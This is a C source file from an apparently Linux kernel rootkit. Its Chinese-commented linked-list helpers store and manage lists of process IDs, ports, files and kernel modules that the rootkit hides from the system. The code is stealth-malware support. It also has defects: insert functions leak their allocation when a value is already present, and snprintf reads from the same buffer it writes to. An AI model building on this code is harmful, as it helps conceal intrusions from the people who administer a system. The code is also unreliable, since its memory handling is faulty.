#include "RTlist.h"


char dispbuf[0x1000];

/**
 * insert_int
 * 用于隐藏进程和端口,表头插入
 * list_ports，list_procs
 * @param list
 * @param i
 */
void
insert_int(struct list_head *list, int i) {
    int ret;
    struct list_int *p;

    p = (struct list_int *) \
    kmalloc(sizeof (struct list_int), GFP_KERNEL);

    if (!p) {
        return;
    }

    ret = search_int(list, i);
    if (ret == 1) {
        p->data = i;
        list_add(&(p->list), list);
    }
}

/**
 * first_int
 * 用于隐藏进程和端口，获取第一个数据
 * list_ports，list_procs
 * @param list
 * @return 
 */
int
first_int(struct list_head *list) {
    struct list_int *p;

    if (list_empty(list)) {
        return 0;
    }

    p = list_entry(list->next, struct list_int, list);

    return p->data;
}

/**
 * get_int
 * 用于隐藏进程和端口，获取第i个数据
 * list_ports，list_procs
 * @param list
 * @param i
 * @return 
 */
int
get_int(struct list_head *list, int i) {
    int n = 0;
    struct list_int *p;
    struct list_head *pos;

    list_for_each(pos, list) {
        if (n++ == i) {
            p = list_entry(pos, struct list_int, list);
            return p->data;
        }
    }

    return 0;
}

/**
 * search_int
 * 用于隐藏进程和端口，检查是否存在i值数据
 * list_ports，list_procs
 * @param list
 * @param i
 * @return 
 */
int
search_int(struct list_head *list, int i) {
    struct list_int *p;
    struct list_head *pos;

    list_for_each(pos, list) {
        p = list_entry(pos, struct list_int, list);
        if (p->data == i) {
            return 0;
        }
    }

    return 1;
}

/**
 * delete_int
 * 用于隐藏进程和端口，删除i值数据
 * list_ports，list_procs
 * @param list
 * @param i
 */
void
delete_int(struct list_head *list, int i) {
    struct list_int *p;
    struct list_head *pos;

    list_for_each(pos, list) {
        p = list_entry(pos, struct list_int, list);
        if (p->data == i) {
            list_del(pos);
            kfree(p);
            break;
        }
    }
}

/**
 * destory_int
 * 用于隐藏进程和端口，销毁整个链表
 * list_ports，list_procs
 * @param list
 */
void
destory_int(struct list_head *list) {
    struct list_int *p;
    struct list_head *pos;

    while (!list_empty(list)) {
        pos = list->next;
        p = list_entry(pos, struct list_int, list);
        list_del(pos);
        kfree(p);
    }
}

/**
 * display_int
 * 用于隐藏进程和端口，显示整个链表
 * list_ports，list_procs
 * @param list
 * @param buf
 * @param len
 * snprintf 最多从源串中拷贝n－1个字符到目标串中，然后再在后面加一个0。
 * 所以如果目标串的大小为n 的话，将不会溢出。
 * int snprintf(char *restrict buf, size_t n, const char * restrict  format, ...);
 * char *strncpy(char *dest, const char *src, int n)
 * 把src所指向的字符串中以src地址开始的前n个字节复制到dest所指的数组中，并返回dest。
 */
void
display_int(struct list_head *list, char *buf, unsigned long len) {
    struct list_int *p;
    struct list_head *pos;

    strcpy(dispbuf, "list:");

    list_for_each(pos, list) {
        p = list_entry(pos, struct list_int, list);
        snprintf(dispbuf, sizeof (dispbuf), "%s%d->", dispbuf, p->data);
    }
    strncpy(buf, dispbuf, len);
}

/**
 * insert_chars
 * 用于隐藏文件、内核模块
 * list_lkms，list_files
 * @param list
 * @param str
 */
void
insert_chars(struct list_head *list, char *str) {
    int ret;
    struct list_chars *p;

    p = (struct list_chars *) \
    kmalloc(sizeof (struct list_chars), GFP_KERNEL);

    if (!p) {
        return;
    }

    ret = search_chars(list, str);
    if (ret == 1) {
        memcpy(p->data, str, MAX_STR);
        list_add(&(p->list), list);
    }
}

/**
 * search_chars
 * 查找隐藏文件、内核模块
 * list_lkms，list_files
 * @param list
 * @param str
 * @return 
 */
int
search_chars(struct list_head *list, char *str) {
    struct list_chars *p;
    struct list_head *pos;

    list_for_each(pos, list) {
        p = list_entry(pos, struct list_chars, list);
        if (!strcmp(p->data, str)) {
            return 0;
        }
    }

    return 1;
}

/**
 * delete_chars
 * 删除隐藏文件、内核模块
 * list_lkms，list_files
 * @param list
 * @param str
 */
void
delete_chars(struct list_head *list, char *str) {
    struct list_chars *p;
    struct list_head *pos;

    list_for_each(pos, list) {
        p = list_entry(pos, struct list_chars, list);
        if (!strcmp(p->data, str)) {
            list_del(pos);
            kfree(p);
            break;
        }
    }
}

/**
 * destory_chars
 * 删除所有隐藏文件或内核模块
 * list_lkms，list_files
 * @param list
 */
void
destory_chars(struct list_head *list) {
    struct list_chars *p;
    struct list_head *pos;

    while (!list_empty(list)) {
        pos = list->next;
        p = list_entry(pos, struct list_chars, list);
        list_del(pos);
        kfree(p);
    }
}

/**
 * display_chars
 * 显示所有隐藏文件或内核模块
 * list_lkms，list_files
 * @param list
 * @param buf
 * @param len
 */
void
display_chars(struct list_head *list, char *buf, unsigned long len) {
    struct list_chars *p = NULL;
    struct list_head *pos = NULL;

    strcpy(dispbuf, "list:");

    list_for_each(pos, list) {
        p = list_entry(pos, struct list_chars, list);
        snprintf(dispbuf, sizeof (dispbuf), "%s%s->", dispbuf, p->data);
    }

    strncpy(buf, dispbuf, len);
}

/*
void
insert_ints(struct list_head *list, int *i, int size) {
    struct list_ints *p;

    p = (struct list_ints *) \
    kmalloc(sizeof (struct list_ints), GFP_KERNEL);

    if (!p) {
        return;
    }

    p->size = size;
    memcpy(p->data, i, sizeof (int) * size);
    list_add(&(p->list), list);
}

int
search_ints(struct list_head *list, int *i, int size) {
    struct list_ints *p = NULL;
    struct list_head *pos = NULL;

    list_for_each(pos, list) {
        p = list_entry(pos, struct list_ints, list);
        if (0 == memcmp(p->data, i, sizeof (int) * size)) {
            memcpy(i, p->data, sizeof (int) * p->size);
            return 0;
        }
    }

    return 1;
}

void
delete_ints(struct list_head *list, int *i, int size) {
    struct list_ints *p = NULL;
    struct list_head *pos = NULL;

    list_for_each(pos, list) {
        p = list_entry(pos, struct list_ints, list);
        if (0 == memcmp(p->data, i, sizeof (int) * size)) {
            memcpy(i, p->data, sizeof (int) * p->size);
            list_del(pos);
            kfree(p);
            break;
        }
    }
}

void
destory_ints(struct list_head *list) {
    struct list_ints *p;
    struct list_head *pos;

    while (!list_empty(list)) {
        pos = list->next;
        p = list_entry(pos, struct list_ints, list);
        list_del(pos);
        kfree(p);
    }
}

void
display_ints(struct list_head *list, char *buf, unsigned long len) {
    struct list_ints *p;
    struct list_head *pos;

    strcpy(dispbuf, "list:");

    list_for_each(pos, list) {
        int i;
        p = list_entry(pos, struct list_ints, list);
        snprintf(dispbuf, sizeof (dispbuf), "%s%d", dispbuf, p->data[0]);
        for (i = 1; i < p->size; i++) {
            snprintf(dispbuf, sizeof (dispbuf), "%s,%d", dispbuf, p->data[i]);
        }
        snprintf(dispbuf, sizeof (dispbuf), "%s->", dispbuf);
    }

    strncpy(buf, dispbuf, len);
}
*/

int
count_list(struct list_head *list) {
    int i = 0;
    struct list_head *pos;

    list_for_each(pos, list) {
        i++;
    }

    return i;
}
